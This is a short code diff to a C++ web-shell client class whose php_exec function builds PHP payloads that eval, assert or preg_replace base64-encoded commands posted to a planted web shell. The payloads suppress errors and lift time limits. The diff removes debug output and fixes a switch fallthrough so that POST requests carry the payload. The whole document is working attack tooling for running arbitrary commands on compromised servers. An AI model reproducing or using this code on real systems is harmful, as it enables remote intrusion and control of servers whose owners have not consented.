@@ -27,7 +27,7 @@ CURLcode WebShell::php_exec(string command,string&ans,map<string,string>*addonpa
 	string  mark = to_string(1000*rand());
 	string evalphp;
 	if (find(disabled_functions.begin(), disabled_functions.end(), "eval") == disabled_functions.end())
-		evalphp = "print_r($_POST);print urlencode($_POST['YQ==']);@ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);echo \"" + mark + "\";eval(base64_decode($_POST[\'" + cryptohelper::base64_encode(pass) + "\']));echo \"" + mark + "\";";
+		evalphp = "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);echo \"" + mark + "\";eval(base64_decode($_POST[\'" + cryptohelper::base64_encode(pass) + "\']));echo \"" + mark + "\";";
 	else if(find(disabled_functions.begin(), disabled_functions.end(), "assert") == disabled_functions.end())
 		evalphp = "@ini_set(\"display_errors\",\"0\");@set_time_limit(0);@set_magic_quotes_runtime(0);echo \"" + mark + "\";assert(base64_decode($_POST[\'" + cryptohelper::base64_encode(pass) + "\']));echo \"" + mark + "\";";
 	else if(find(disabled_functions.begin(), disabled_functions.end(), "preg_replace") == disabled_functions.end())
@@ -58,8 +58,9 @@ CURLcode WebShell::php_exec(string command,string&ans,map<string,string>*addonpa
 		switch (Method) {
 		case GET:
 			params[pass] = curlhelper::UrlEncode(evalphp);
+			break;
 		case POST:
-			params[pass] = curlhelper::UrlEncode(evalphp);
+			postparams[pass] = curlhelper::UrlEncode(evalphp);
 		default:
 			break;
 		}
